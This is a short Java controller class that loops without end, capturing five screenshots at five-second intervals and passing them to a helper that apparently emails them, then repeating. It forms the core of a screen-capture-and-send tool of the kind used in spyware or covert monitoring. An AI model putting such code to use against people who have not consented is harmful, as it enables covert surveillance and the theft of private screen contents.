package screenshottest;

public class Controller {

    public void process() {
        TakeSnaps ts = new TakeSnaps();
        TransferData td = new TransferData();
        String att[];
        while (true) {
            att = new String[5];
            for (int i = 0; i < 5; i++) {
                String fname = ts.snaps("Snap" + (i + 1));
                if (fname != null) {
                    att[i] = fname;
                }
                try {
                    Thread.sleep(5000);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            System.out.println("sending mail");
            td.send(att);
            System.out.println("mail sent");
            att= null;
            try {
                Thread.sleep(10000);
            } catch (Exception e) {
            }
        }
    }
}
